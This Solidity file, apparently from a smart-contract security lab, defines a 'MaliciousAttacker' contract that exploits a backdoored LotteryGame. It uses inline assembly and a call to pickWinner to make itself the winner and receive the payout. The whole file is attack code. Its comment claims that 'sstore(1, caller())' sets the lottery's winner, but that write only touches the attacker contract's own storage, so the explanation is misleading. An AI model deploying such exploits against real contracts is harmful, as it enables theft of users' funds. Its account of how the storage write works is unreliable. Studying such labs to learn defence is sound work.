// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./Backdoor-assembly.sol";

contract MaliciousAttacker {
    LotteryGame public lotteryGame;

    constructor(address _lotteryGame) {
        lotteryGame = LotteryGame(_lotteryGame);
    }

    function attack() public {
        // Use assembly to directly set the winner in storage
        assembly {
            // Set the winner to the address of this contract
            sstore(1, caller())
        }

        // Call the pickWinner function to trigger the backdoor and set the winner
        lotteryGame.pickWinner(address(this));
    }

    receive() external payable {}
}